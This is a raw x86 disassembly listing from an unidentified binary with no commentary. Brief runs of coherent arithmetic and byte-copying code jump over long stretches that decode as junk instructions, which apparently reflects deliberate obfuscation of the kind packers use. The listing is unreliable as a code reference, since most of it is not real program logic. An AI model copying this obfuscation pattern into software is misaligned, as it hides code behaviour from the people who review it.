  40af68:	push   0x2f
  40af6a:	stos   BYTE PTR es:[edi],al
  40af6b:	push   es
  40af6c:	arpl   WORD PTR [esp+edx*2+0x2f],sp
  40af70:	fadd   DWORD PTR [esi+eiz*2+0x26]
  40af74:	dec    ebx
  40af75:	imul   ebx,eax,0xffffffeb
  40af78:	or     BYTE PTR [edi+ebx*1-0x48],cl
  40af7c:	push   ecx
  40af7d:	xor    BYTE PTR [esi],ah
  40af7f:	push   ds
  40af80:	push   ebp
  40af81:	jnp    0x40afed
  40af83:	xchg   ecx,eax
  40af84:	adc    BYTE PTR [esi+edx*2-0x480f710d],cl
  40af8b:	js     0x40af93
  40af8d:	(bad)  
  40af8e:	lock jle 0x40af39
  40af91:	adc    ah,bl
  40af93:	daa    
  40af94:	leave  
  40af95:	int    0xe6
  40af97:	fistp  DWORD PTR [ebp+0x44]
  40af9a:	mov    cl,0x96
  40af9c:	mov    dl,0x7b
  40af9e:	js     0x40b008
  40afa0:	sub    al,0x2
  40afa2:	inc    edi
  40afa3:	daa    
  40afa4:	stos   DWORD PTR es:[edi],eax
  40afa5:	jnp    0x40af45
  40afa7:	pop    ss
  40afa8:	add    cl,BYTE PTR [eax-0x72]
  40afab:	es sar ebx,0xfa
  40afaf:	cmp    cl,BYTE PTR [edi+0x25]
  40afb2:	dec    esp
  40afb3:	mov    DWORD PTR [eax],ebx
  40afb5:	add    dl,0xdd
  40afb8:	mov    bl,BYTE PTR ds:0xa4fd127
  40afbe:	enter  0x1ce8,0xb0
  40afc2:	sbb    al,0xa1
  40afc4:	popf   
  40afc5:	push   ds
  40afc6:	not    BYTE PTR [edi]
  40afc8:	jmp    0x40b01a
  40afca:	sub    DWORD PTR [edi+0x37a0370a],eax
  40afd0:	mov    esp,0x6cb0be00
  40afd5:	cld    
  40afd6:	int    0xb5
  40afd8:	xchg   BYTE PTR [ebp+0x78ece2c2],ch
  40afde:	push   esi
  40afdf:	xchg   bl,ah
  40afe1:	or     ecx,DWORD PTR [ebp+0x5d8b73c9]
  40afe7:	loopne 0x40aff8
  40afe9:	scas   eax,DWORD PTR es:[edi]
  40afea:	ror    DWORD PTR [ebx-0x2ccc1ba3],cl
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	frstor [ebx-0x21]
  40b0f7:	and    al,0x9e
  40b0f9:	ret    0xbeaf
  40b0fc:	mov    esi,0xbebec2a9
  40b101:	xor    BYTE PTR [edx+0x4e],0x8b
  40b105:	xchg   edx,eax
  40b106:	push   esi
  40b107:	in     eax,dx
  40b108:	mov    ecx,0xf93d40c5
  40b10d:	xor    ch,dl
  40b10f:	lea    edx,[edi-0x1d116ddd]
  40b115:	add    eax,0x3ec0b05b
  40b11a:	inc    eax
  40b11b:	rcl    DWORD PTR [eax+0x6beca35f],0xa4
  40b122:	retf   0xcffd
  40b125:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b127:	in     al,0xb7
  40b129:	inc    ebp
  40b12a:	cdq    
  40b12b:	inc    cl
  40b12d:	int3   
  40b12e:	ins    BYTE PTR es:[edi],dx
  40b12f:	aam    0x57
  40b131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b132:	stos   DWORD PTR es:[edi],eax
  40b133:	cmp    ah,al
  40b135:	(bad)  
  40b136:	cli    
  40b137:	push   eax
  40b138:	xchg   edi,eax
  40b139:	and    al,0xe2
  40b13b:	jp     0x40b105
  40b13d:	sbb    ah,BYTE PTR [eax+0x6e]
  40b140:	ins    DWORD PTR es:[edi],dx
  40b141:	and    eax,0x9f2b8700
  40b146:	shl    BYTE PTR [esi-0x4c],cl
  40b149:	mov    dh,0xec
  40b14b:	pushf  
  40b14c:	push   ebp
  40b14d:	cmp    ah,BYTE PTR [ebx+0x130555c5]
  40b153:	jae    0x40b1b2
  40b155:	sub    BYTE PTR [esi-0x35],0x44
  40b159:	sahf   
  40b15a:	cmp    eax,0xa8bfe00e
  40b15f:	(bad)  
  40b160:	fcomip st,st(7)
  40b162:	aam    0xbd
  40b164:	mov    esp,0x3e034996
  40b169:	push   ss
  40b16a:	cmp    ax,si
  40b16d:	and    eax,0x2a50ec84
  40b172:	add    eax,0xe2d1a58a
  40b177:	pop    esi
  40b178:	clc    
  40b179:	adc    cl,BYTE PTR [ecx+0xd]
  40b17c:	fidivr WORD PTR ds:0x50d8c351
  40b182:	add    DWORD PTR [ebp+0x3e],edi
  40b185:	push   DWORD PTR [eax+ecx*8+0x0]
  40b189:	ss add eax,0x3f77cd41
  40b18f:	test   BYTE PTR [ecx],bl
  40b191:	fadd   QWORD PTR [ecx-0x131865b0]
  40b197:	cs dec ebp
  40b199:	dec    ebp
  40b19a:	and    ch,BYTE PTR [edx+0x6e9c3be9]
  40b1a0:	add    DWORD PTR [eax+0x23],edi
  40b1a3:	popa   
  40b1a4:	jl     0x40b16a
  40b1a6:	mov    edi,0x70aca05e
  40b1ab:	push   ds
  40b1ac:	jne    0x40b1c7
  40b1ae:	test   BYTE PTR [ecx-0x329d0d22],dh
  40b1b4:	sbb    BYTE PTR [edi+0x40],bl
  40b1b7:	mov    ?,WORD PTR [ecx-0x3eac7a19]
  40b1bd:	loop   0x40b171
  40b1bf:	popf   
  40b1c0:	pop    edi
  40b1c1:	nop
  40b1c2:	mov    cl,0xdd
  40b1c4:	mov    ch,0x4e
  40b1c6:	jp     0x40b20f
  40b1c8:	mov    DWORD PTR [ebx-0xf],eax
  40b1cb:	or     al,0x2e
  40b1cd:	test   DWORD PTR [ecx+edi*1+0x41],edx
  40b1d1:	and    esp,ecx
  40b1d3:	xchg   ecx,eax
  40b1d4:	stos   BYTE PTR es:[edi],al
  40b1d5:	and    edi,ebx
  40b1d7:	fs pop esp
  40b1d9:	xchg   edi,eax
  40b1da:	lock imul esp,DWORD PTR [esi],0xffffffcc
  40b1de:	cmc    
  40b1df:	lahf   
  40b1e0:	scas   eax,DWORD PTR es:[edi]
  40b1e1:	mov    ebp,0xccca7cdf
  40b1e6:	das    
  40b1e7:	sbb    al,0x54
  40b1e9:	not    ah
  40b1eb:	lods   eax,DWORD PTR ds:[esi]
  40b1ec:	adc    al,BYTE PTR [esi]
  40b1ee:	mov    edi,0xb696a104
  40b1f3:	popf   
  40b1f4:	jp     0x40b1ab
  40b1f6:	aaa    
  40b1f7:	lds    edx,FWORD PTR [edx+0x8391d3c]
  40b1fd:	push   edx
  40b1fe:	data16 outs dx,BYTE PTR ds:[esi]
  40b200:	shl    edx,cl
  40b202:	mov    ch,0x6a
  40b204:	test   eax,0xe7aee0b4
  40b209:	push   0x63
  40b20b:	aad    0xa0
  40b20d:	mov    ecx,0xbf6a0361
  40b212:	sbb    ecx,esp
  40b214:	jge    0x40b260
  40b216:	xor    dh,BYTE PTR [ecx-0x66a09254]
  40b21c:	adc    bh,dl
  40b21e:	fstp   DWORD PTR [edx-0x7]
  40b221:	fisubr DWORD PTR [ecx+eiz*1]
  40b224:	jle    0x40b216
  40b226:	pop    esi
  40b227:	xor    al,0xfe
  40b229:	lea    ecx,[edx]
  40b22b:	jb     0x40b24c
  40b22d:	std    
  40b22e:	adc    eax,0x6014e28f
  40b233:	push   edx
  40b234:	pop    ebp
  40b235:	mov    esp,0x1faab5a5
  40b23a:	sub    BYTE PTR [esp+esi*2-0x7a],bh
  40b23e:	test   dh,cl
  40b240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b241:	aaa    
  40b242:	inc    esp
  40b243:	int3   
  40b244:	stos   BYTE PTR es:[edi],al
  40b245:	scas   al,BYTE PTR es:[edi]
  40b246:	dec    esp
  40b247:	inc    edx
  40b248:	push   esp
  40b249:	test   DWORD PTR [edx],esp
  40b24b:	out    0xf3,eax
  40b24d:	mov    esi,DWORD PTR [ebp+0x15]
  40b250:	inc    ebp
  40b251:	adc    al,0xbb
  40b253:	mov    es,WORD PTR ds:0x59f21902
  40b259:	cld    
  40b25a:	mov    edi,0xfe20628d
  40b25f:	(bad)  
  40b260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b261:	cmp    eax,0x53cfc14e
  40b266:	push   esi
  40b267:	imul   eax,DWORD PTR [esi],0xffffff94
  40b26a:	inc    ebp
  40b26b:	dec    esp
  40b26c:	cdq    
  40b26d:	fldcw  WORD PTR [esp+0x50]
  40b271:	aam    0x9
  40b273:	jno    0x40b23f
  40b275:	lea    esp,[ecx]
  40b277:	sub    BYTE PTR [esi],bl
  40b279:	out    0xe0,al
  40b27b:	repnz dec eax
  40b27d:	cmp    cl,0xfb
  40b280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b281:	inc    edx
  40b282:	mov    ebp,0xcdacdda6
  40b287:	jmp    0x9ac4a25a
  40b28c:	xchg   ecx,eax
  40b28d:	xchg   ebx,eax
  40b28e:	dec    ecx
  40b28f:	adc    al,0x47
  40b291:	outs   dx,DWORD PTR ds:[esi]
  40b292:	jbe    0x40b2ad
  40b294:	loop   0x40b2eb
  40b296:	pop    esp
  40b297:	pop    eax
  40b298:	lds    edi,FWORD PTR [edi*1+0xe9c05a6]
  40b29f:	in     eax,dx
  40b2a0:	sbb    al,0x39
  40b2a2:	mov    dh,0x70
  40b2a4:	xchg   edx,eax
  40b2a5:	and    eax,0x90f8339d
  40b2aa:	fiadd  DWORD PTR [ecx]
  40b2ac:	mov    ch,0x48
  40b2ae:	jmp    0x9bf6:0x87601ffb
  40b2b5:	mov    ds:0xfd0577f5,al
  40b2ba:	mov    ds:0xa870b6ba,eax
  40b2bf:	iret   
  40b2c0:	lahf   
  40b2c1:	jo     0x40b2ca
  40b2c3:	pop    esi
  40b2c4:	xchg   edi,eax
  40b2c5:	sbb    BYTE PTR [edi-0x26],bl
  40b2c8:	xlat   BYTE PTR ds:[ebx]
  40b2c9:	dec    ebx
  40b2ca:	aad    0x23
  40b2cc:	cmc    
  40b2cd:	out    0x99,eax
  40b2cf:	stos   DWORD PTR es:[edi],eax
  40b2d0:	add    al,0xc
  40b2d2:	stos   DWORD PTR es:[edi],eax
  40b2d3:	and    ecx,DWORD PTR [edi]
  40b2d5:	adc    dl,BYTE PTR [eax-0x39ce7b7a]
  40b2db:	cdq    
  40b2dc:	js     0x40b2cc
  40b2de:	shl    BYTE PTR [edi+esi*8-0x43bbac63],1
  40b2e5:	scas   al,BYTE PTR es:[edi]
  40b2e6:	and    al,0x2f
  40b2e8:	fucomip st,st(3)
  40b2ea:	or     al,0x3c
  40b2ec:	imul   esi,DWORD PTR [ebp-0x45381fa7],0x2b2bc937
  40b2f6:	mov    cl,0xc1
  40b2f8:	mov    eax,ds:0xc970b127
  40b2fd:	int3   
  40b2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ff:	and    eax,0x194dc795
  40b304:	retf   0xbece
  40b307:	mov    bh,0xc9
  40b309:	sub    edi,DWORD PTR [esi]
  40b30b:	shl    DWORD PTR [ebp-0x28],1
  40b30e:	dec    edx
  40b30f:	sbb    eax,0x26fc26e5
  40b314:	pop    ds
  40b315:	sub    ebx,ebx
  40b317:	push   ds
  40b318:	retf   0xaebc
  40b31b:	call   0x2d44360d
  40b320:	inc    ebx
  40b321:	push   ecx
  40b322:	mov    dl,0xdb
  40b324:	mov    ah,0xdd
  40b326:	fwait
  40b327:	mov    dh,0x0
  40b329:	mov    bh,0xb8
  40b32b:	(bad)  
  40b32c:	retf   
  40b32d:	rol    BYTE PTR [edx+0x53],cl
  40b330:	push   cs
  40b331:	pop    ss
  40b332:	fld    DWORD PTR [ecx]
  40b334:	sar    esi,1
  40b336:	ja     0x40b31a
  40b338:	lea    eax,[edi+0x39]
  40b33b:	dec    edi
  40b33c:	repz stc 
  40b33e:	pop    esp
  40b33f:	loope  0x40b2db
  40b341:	push   ds
  40b342:	mov    al,0x58
  40b344:	shr    BYTE PTR [edx+0x1b],1
  40b347:	(bad)  
  40b348:	sti    
  40b349:	(bad)  
  40b34a:	shl    ch,cl
  40b34c:	sbb    ch,BYTE PTR [esi-0x6ae335c3]
  40b352:	fst    DWORD PTR [esi-0xdd16d5c]
  40b358:	inc    ebx
  40b359:	mov    cl,0x1b
  40b35b:	std    
  40b35c:	int    0x78
  40b35e:	push   ss
  40b35f:	jl     0x40b392
  40b361:	hlt    
  40b362:	enter  0x7d53,0x53
  40b366:	and    BYTE PTR ds:0x8d914954,dl
  40b36c:	mov    eax,0x773ac64d
  40b371:	or     bh,dh
  40b373:	fisttp QWORD PTR [edi+0x2fa1e74]
  40b379:	cmp    cl,BYTE PTR [edx+0x2b]
  40b37c:	lock mov eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x422728
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	repz push cs
  40b3d3:	adc    bl,BYTE PTR [esi-0x41414c53]
  40b3d9:	test   eax,0x40bebec2
  40b3de:	cmp    edx,DWORD PTR [esi]
  40b3e0:	mov    eax,DWORD PTR [ecx-0x18]
  40b3e3:	(bad)  
  40b3e4:	cdq    
  40b3e5:	cmp    esi,DWORD PTR [ecx+esi*4+0x31bcf26d]
  40b3ec:	div    DWORD PTR [edx]
  40b3ee:	jg     0x40b388
  40b3f0:	retf   
  40b3f1:	dec    ecx
  40b3f2:	pop    es
  40b3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3f4:	stc    
  40b3f5:	sub    edi,0x2a
  40b3f8:	inc    ebx
  40b3f9:	pop    ebp
  40b3fa:	(bad)  
  40b3fb:	dec    esi
  40b3fc:	leave  
  40b3fd:	cs shl bh,cl
  40b400:	xchg   ebp,eax
  40b401:	and    BYTE PTR [ecx-0x9],0x12
  40b405:	lds    esi,FWORD PTR [edi+edx*4-0x3de76f95]
  40b40c:	outs   dx,DWORD PTR ds:[esi]
  40b40d:	mov    BYTE PTR [ecx+0x17],bl
  40b410:	pop    ebp
  40b411:	repnz push esp
  40b413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b414:	or     eax,0x2ebef542
  40b419:	daa    
  40b41a:	push   esi
  40b41b:	rcl    BYTE PTR [edi],1
  40b41d:	js     0x40b451
  40b41f:	aaa    
  40b420:	rcr    DWORD PTR [esi],cl
  40b422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b423:	aad    0xa7
  40b425:	ds pop es
  40b427:	push   0x9026634
  40b42c:	mov    dh,0x1d
  40b42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b42f:	stos   DWORD PTR es:[edi],eax
  40b430:	cmp    BYTE PTR [edx+0x62a58f38],dl
  40b436:	adc    BYTE PTR [esi-0x78],ch
  40b439:	lahf   
  40b43a:	pop    ebx
  40b43b:	mov    eax,ds:0x76b579b3
  40b440:	pop    es
  40b441:	and    DWORD PTR [eax+0x53],edi
  40b444:	lahf   
  40b445:	aaa    
  40b446:	mov    ds,esi
  40b448:	sti    
  40b449:	retf   0xd118
  40b44c:	call   0x2ed9:0x2419a686
  40b453:	out    dx,al
  40b454:	sub    ebp,DWORD PTR [eax+0x45c0ba00]
  40b45a:	in     al,0x72
  40b45c:	inc    esp
  40b45d:	add    eax,0x9993c0e7
  40b462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b463:	mov    dl,0xc8
  40b465:	sbb    BYTE PTR gs:[edi+0x70baa1c2],al
  40b46c:	push   edx
  40b46d:	or     edi,DWORD PTR [eax+0x7bf4d1ca]
  40b473:	inc    edi
  40b474:	xchg   ecx,eax
  40b475:	dec    ebx
  40b476:	mov    dl,0xb5
  40b478:	cmp    edx,ebp
  40b47a:	repz jns 0x40b4f5
  40b47d:	mov    bl,BYTE PTR [ebp+0x3e84fee0]
  40b483:	in     eax,0x8e
  40b485:	dec    ebp
  40b486:	adc    BYTE PTR [edx-0x2e],0xf6
  40b48a:	pop    ds
  40b48b:	(bad)  
  40b48c:	or     al,0xb5
  40b48e:	sub    eax,0xf83fa771
  40b493:	sub    ecx,edx
  40b495:	rcl    DWORD PTR [ebx],1
  40b497:	mov    ds:0x7c178715,al
  40b49c:	mov    cl,al
  40b49e:	popfw  
  40b4a0:	mov    dh,0x25
  40b4a2:	shr    BYTE PTR [eax+eax*4-0x3c5b396e],0x9f
  40b4aa:	call   0x3d6b4ebb
  40b4af:	ja     0x40b520
  40b4b1:	sbb    al,0xcf
  40b4b3:	push   ebp
  40b4b4:	bnd ret 0x7305
  40b4b8:	retf   
  40b4b9:	add    ebx,ebx
  40b4bb:	jle    0x40b47f
  40b4bd:	mov    esi,0xe42f6018
  40b4c2:	pusha  
  40b4c3:	iret   
  40b4c4:	cmp    bh,cl
  40b4c6:	adc    esi,ebx
  40b4c8:	repnz sub DWORD PTR [ecx-0x2467b1b8],edi
  40b4cf:	je     0x40b507
  40b4d1:	pop    ss
  40b4d2:	inc    eax
  40b4d3:	adc    esi,0x2e
  40b4d6:	or     al,0xec
  40b4d8:	push   ecx
  40b4d9:	mov    ebp,0xddfe8932
  40b4de:	dec    edi
  40b4df:	test   al,0x7c
  40b4e1:	xlat   BYTE PTR ds:[ebx]
  40b4e2:	mov    ecx,0xa5f8d7ae
  40b4e7:	dec    edi
  40b4e8:	mov    bl,0x6d
  40b4ea:	mov    dh,0x5e
  40b4ec:	in     al,dx
  40b4ed:	adc    DWORD PTR [ebp-0x6c],ecx
  40b4f0:	std    
  40b4f1:	out    dx,eax
  40b4f2:	cmp    bh,BYTE PTR [eax]
  40b4f4:	pop    ecx
  40b4f5:	jmp    0xe34c:0x56b23d2b
  40b4fc:	sbb    al,0x7f
  40b4fe:	or     eax,0xffffffe1
  40b501:	loope  0x40b573
  40b503:	push   ss
  40b504:	pop    ecx
  40b505:	test   eax,0x676e6e33
  40b50a:	jne    0x40b577
  40b50c:	fwait
  40b50d:	arpl   WORD PTR [ecx+ecx*4],bx
  40b510:	repnz in eax,0x95
  40b513:	inc    ebx
  40b514:	scas   al,BYTE PTR es:[edi]
  40b515:	inc    ebx
  40b516:	jmp    0x40b541
  40b518:	xchg   ebx,eax
  40b519:	rcr    BYTE PTR [edi-0x772fa62c],0x39
  40b520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b521:	mov    dh,0x4f
  40b523:	sbb    bh,BYTE PTR [ecx]
  40b525:	mov    es,WORD PTR [edx]
  40b527:	dec    ebp
  40b528:	and    al,0xb0
  40b52a:	out    dx,al
  40b52b:	int    0xf4
  40b52d:	jbe    0x40b539
  40b52f:	adc    BYTE PTR [ebp+0x71],dl
  40b532:	push   ecx
  40b533:	xchg   esi,eax
  40b534:	addr16 in al,dx
  40b536:	aaa    
  40b537:	and    edi,esi
  40b539:	cmp    dl,ah
  40b53b:	repnz (bad) 
  40b53d:	mov    edx,0x279fbeac
  40b542:	push   cs
  40b543:	xchg   ecx,eax
  40b544:	hlt    
  40b545:	lds    ebp,FWORD PTR [ecx-0x72]
  40b548:	mov    ebp,0x629b4e1
  40b54d:	mov    eax,0xff678361
  40b552:	cmp    al,0x7c
  40b554:	test   eax,0xae1e236
  40b559:	les    esi,FWORD PTR gs:[esi]
  40b55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b55d:	push   ebp
  40b55e:	out    dx,al
  40b55f:	ror    BYTE PTR [ecx],1
  40b561:	test   BYTE PTR [esi+ebp*8+0x3511b5b8],0x99
  40b569:	js     0x40b547
  40b56b:	push   ds
  40b56c:	(bad)  
  40b56d:	pop    esp
  40b56e:	xor    BYTE PTR [esi+0x2190b29b],dh
  40b574:	fucomp st(0)
  40b576:	adc    eax,0x9c6690f3
  40b57b:	add    DWORD PTR [edx-0x51],eax
  40b57e:	sbb    al,0xf3
  40b580:	adc    BYTE PTR [edi],bh
  40b582:	mov    eax,ds:0xb0fd68b8
  40b587:	lds    edi,FWORD PTR [edx-0x1c]
  40b58a:	xchg   ebx,eax
  40b58b:	sbb    DWORD PTR [ebp+0x2616d014],eax
  40b591:	test   edi,edi
  40b593:	dec    ecx
  40b594:	cli    
  40b595:	hlt    
  40b596:	retf   
  40b597:	outs   dx,DWORD PTR ds:[esi]
  40b598:	stos   BYTE PTR es:[edi],al
  40b599:	gs test eax,0xae1a68d6
  40b59f:	mov    cl,0x66
  40b5a1:	add    eax,edx
  40b5a3:	(bad)  ds:[ecx-0x71d844b2]
  40b5aa:	lahf   
  40b5ab:	push   0xac00f31c
  40b5b0:	(bad)  
  40b5b1:	aas    
  40b5b2:	mov    ds:0xe687a69,al
  40b5b7:	int3   
  40b5b8:	pop    ds
  40b5b9:	out    0xfa,al
  40b5bb:	lods   eax,DWORD PTR ds:[esi]
  40b5bc:	lods   eax,DWORD PTR ds:[esi]
  40b5bd:	stos   DWORD PTR es:[edi],eax
  40b5be:	in     eax,0xde
  40b5c0:	jmp    0x3326:0xbc813e7f
  40b5c7:	shl    BYTE PTR [ecx-0x4c90bba2],0xed
  40b5ce:	leave  
  40b5cf:	(bad)  
  40b5d0:	iret   
  40b5d1:	fucomip st,st(4)
  40b5d3:	bound  ebp,QWORD PTR [ebp-0x1e]
  40b5d6:	pop    ss
  40b5d7:	inc    edx
  40b5d8:	daa    
  40b5d9:	xchg   esp,eax
  40b5da:	shr    BYTE PTR [esi],0xb7
  40b5dd:	repz and al,0xdd
  40b5e0:	daa    
  40b5e1:	rol    esi,0x50
  40b5e4:	mov    ds:0x2a6b9c8e,al
  40b5e9:	fld    DWORD PTR [eax+0x60]
  40b5ec:	push   0x5b
  40b5ee:	lock mov dh,0x70
  40b5f1:	or     al,0xaf
  40b5f3:	lock fs ins DWORD PTR es:[edi],dx
  40b5f6:	pop    esi
  40b5f7:	pop    esp
  40b5f8:	je     0x40b66b
  40b5fa:	sbb    BYTE PTR [edx],0x82
  40b5fd:	xchg   ebp,eax
  40b5fe:	cmp    al,0x1d
  40b600:	retf   0xf441
  40b603:	loop   0x40b632
  40b605:	cli    
  40b606:	popf   
  40b607:	push   ecx
  40b608:	lods   eax,DWORD PTR ds:[esi]
  40b609:	je     0x40b666
  40b60b:	sbb    ch,ch
  40b60d:	cmp    ebp,ebx
  40b60f:	rol    BYTE PTR [ebp+0x73b1eeb],1
  40b615:	ja     0x40b5fb
  40b617:	mov    esp,edi
  40b619:	dec    esp
  40b61a:	fimul  DWORD PTR ds:0x3f9850b0
  40b620:	nop
  40b621:	or     DWORD PTR [ebx+0x0],esp
  40b624:	add    ch,cl
  40b626:	adc    eax,DWORD PTR [ebx-0x74]
  40b629:	lods   al,BYTE PTR ds:[esi]
  40b62a:	mov    esp,0x11c427e5
  40b62f:	lahf   
  40b630:	dec    edi
  40b631:	out    0x5a,eax
  40b633:	cmp    bh,BYTE PTR [edx+0x5c]
  40b636:	aaa    
  40b637:	pop    esp
  40b638:	dec    edi
  40b639:	jnp    0x40b631
  40b63b:	in     al,dx
  40b63c:	mov    DWORD PTR [ebx+ecx*4-0x3d492dc4],esi
  40b643:	sub    eax,0x5a3da7
  40b648:	inc    esp
  40b649:	addr16 icebp 
  40b64b:	xchg   edx,eax
  40b64c:	dec    ebp
  40b64d:	sub    esi,edx
  40b64f:	nop
  40b650:	int    0x7d
  40b652:	pushf  
  40b653:	and    eax,0x8b71f5e9
  40b658:	push   ebp
  40b659:	lock or eax,edx
  40b65c:	xor    eax,0x59f6
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x3e269e60,eax
  40b6b1:	or     dl,BYTE PTR [edx-0x41414866]
  40b6b7:	xchg   edx,eax
  40b6b8:	les    edi,FWORD PTR [esi-0x7074842]
  40b6be:	fadd   QWORD PTR [ebx-0x36]
  40b6c1:	ds call 0x8c5b516f
  40b6c7:	aaa    
  40b6c8:	ret    0x2523
  40b6cb:	pushf  
  40b6cc:	or     al,0x90
  40b6ce:	lods   al,BYTE PTR ds:[esi]
  40b6cf:	add    al,0x41
  40b6d1:	mov    ah,0xd9
  40b6d3:	push   esi
  40b6d4:	out    0xa3,eax
  40b6d6:	push   ebx
  40b6d7:	push   esi
  40b6d8:	dec    ebp
  40b6d9:	mov    bh,0x76
  40b6db:	daa    
  40b6dc:	ret    0xd4dd
  40b6df:	inc    eax
  40b6e0:	lods   al,BYTE PTR ds:[esi]
  40b6e1:	je     0x40b698
  40b6e3:	mov    ah,0x50
  40b6e5:	adc    dl,BYTE PTR [esi+eax*8]
  40b6e8:	sub    edx,DWORD PTR [edi+0x7e86fed7]
  40b6ee:	(bad)  
  40b6ef:	bound  ebx,QWORD PTR [ebp+0x2b7365b0]
  40b6f5:	add    edi,DWORD PTR [esi]
  40b6f7:	sbb    eax,0x5d9e40dd
  40b6fd:	or     cl,BYTE PTR [edx-0x2abaddc0]
  40b703:	out    0x34,eax
  40b705:	mov    dh,BYTE PTR [edx+ecx*4-0xd]
  40b709:	push   esi
  40b70a:	mov    ch,0xe
  40b70c:	xor    ebp,0x4d
  40b70f:	hlt    
  40b710:	push   ss
  40b711:	fst    st(6)
  40b713:	jmp    0x21cddbbb
